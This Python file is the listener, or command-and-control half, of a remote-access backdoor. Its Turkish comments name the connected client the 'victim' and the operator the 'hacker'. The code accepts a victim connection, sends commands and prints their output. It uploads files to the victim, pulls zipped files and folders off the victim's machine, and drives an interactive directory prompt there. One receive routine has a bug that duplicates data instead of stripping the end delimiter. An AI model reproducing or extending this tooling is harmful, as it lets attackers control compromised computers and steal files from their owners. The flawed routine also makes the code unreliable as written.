import socket


CHUNK_SIZE = 4 * 1024
DELIMETER = "<END_OF_RESULTS>"


class ServerConnection:
    def __init__(self):
        """ creates a TCP socket for server
        """
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def createConnection(self, ip="", port=8080):
        self.server_ip = ip
        self.server_port = port
        self.address = (self.server_ip, self.server_port)
        self.socket.bind(self.address)

    def listen(self, backlog=5):
        self.socket.listen(backlog)

    def acceptConnection(self):
        self.client_conn, self.client_add = self.socket.accept()
        print("\t\t[+] Baglanti Kuruldu " +
              self.client_add[0] + " port " + str(self.client_add[1]))
        return (self.client_conn, self.client_add)

    def send_data(self, user_input):
        user_input_bytes = bytes(user_input, "utf-8")
        self.client_conn.send(user_input_bytes)

    def receive_data(self):
        rcvd_data_bytes = self.client_conn.recv(CHUNK_SIZE)
        self.data = rcvd_data_bytes.decode("utf-8")
        return self.data

    def receive_command_result(self):
        print("[+] Komut sonucu")

        result = b''

        while True:
            chunk = self.client_conn.recv(CHUNK_SIZE)

            if chunk.endswith(DELIMETER.encode()):
                chunk += chunk[:-len(DELIMETER)]
                result += chunk
                break

            result += chunk

        print(result.decode())

    def send_file(self, filename):
        print("[+] Dosya Gonderiliyor...")
        with open(filename, "rb") as file:  # rb = read , binary
            chunk = file.read(CHUNK_SIZE)

            while len(chunk) > 0:  # Doysanin bos  olup olmadigini kontrol etmek icin
                self.client_conn.send(chunk)

                chunk = file.read(CHUNK_SIZE)

            # tüm dosyanın aktarıldığını belirtmek için delimeter ekledik
            self.client_conn.send(DELIMETER.encode())
            # client (victim) tarafindan Zip dosyasinin alinmasi icin

    def receive_zipped(self, zipped_file):
        print("[+] zip dosyasi aliniyor")

        full_file = b''

        while True:
            chunk = self.client_conn.recv(CHUNK_SIZE)
            if chunk.endswith(DELIMETER.encode()):
                chunk = chunk[:-len(DELIMETER)]

                full_file += chunk
                break

            full_file += chunk

        with open(zipped_file, "wb") as file:
            file.write(full_file)
            print("[+] Dosya/klasor basariyla alindi")

    def change_dir(self):
        print("[+] dir degistiriliyor")

        pwd = self.receive_data()  # pwd = present working dir

        while True:
            print(f'{pwd} >>', end=" ")
            # sununcunu (hackerin) yazmis oldugu komutu hackere aktarma
            user_command = input("")
            self.send_data(user_command)
            if user_command == "stop":
                break
            # clientten gelen present working dir
            pwd = self.receive_data()
